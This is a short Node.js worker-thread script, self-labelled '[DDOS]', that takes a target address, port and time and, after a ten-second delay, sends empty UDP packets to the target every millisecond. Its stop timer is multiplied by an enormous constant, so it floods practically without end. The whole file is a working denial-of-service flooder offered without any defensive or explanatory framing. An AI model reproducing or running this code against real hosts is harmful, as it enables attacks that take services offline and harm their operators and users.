const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log(`ANSI_YELLOW+[DDOS] Can't send packet to ${address}:${port} [${error}] : (`)
          clearInterval(task);
          console.log(`[DDOS] Stopped!`)
          return;
        }
        console.log(`[DDOS] Sending packets in ${address}:${port}...`)
      });

    }, 1)//(1000 / (times <= 0 ? 1000 : times))
  }, 10000)

  setTimeout(() => {
    clearInterval(task);
    console.log(`[DDOS] Stopped!`)
  }, 10000 * 9999999999999999999999999999999999999999999999999999999999999999 * time);

  console.log(`[DDOS] Started!`)
});
